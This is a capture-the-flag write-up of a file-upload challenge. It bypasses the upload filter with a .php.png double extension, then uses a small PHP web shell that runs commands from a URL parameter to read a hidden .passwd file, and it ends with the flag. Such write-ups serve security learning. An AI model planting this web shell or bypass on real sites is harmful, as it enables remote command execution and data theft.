#2extensions #doubleextensions #phpupload #phpc #phpcommand
 
 ##### Challenge Description 

Your goal is to hack this photo galery by uploading PHP code.  
Retrieve the validation password in the file .passwd at the root of the application.


When I upload my malicious php file : 

![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260306224114.png)

What is this malicious file doing ? : 

```
<?php
if(isset($_GET['c'])) {
    echo "<pre>"; 
    system($_GET['c']);
    echo "</pre>";
}
?>
```

It allows me to add a c 


Because of the Challenge Name, I tried to replace the file extension .php to .php.png :

![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260306224328.png)

It worked !

Now let's find the flag in .passwd ! But where is it located ?

I tried to find the find with this command : 

```
ls -la ../../../
```

![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260306224703.png)


After some research I found the .passwd location 

>[!note]
>```
>```ls -la```  allows me to find every file even the ones that are hidden 

Because I know that the file is located in :

```
../../../.passwd
```

Let's open it : 

```
cat ../../../.passwd
```

![](../../PicoCTF/PicoCTF-assets/Pasted%20image%2020260306224935.png)

Flag : Gg9LRz-hWSxqqUKd77-_q-6G8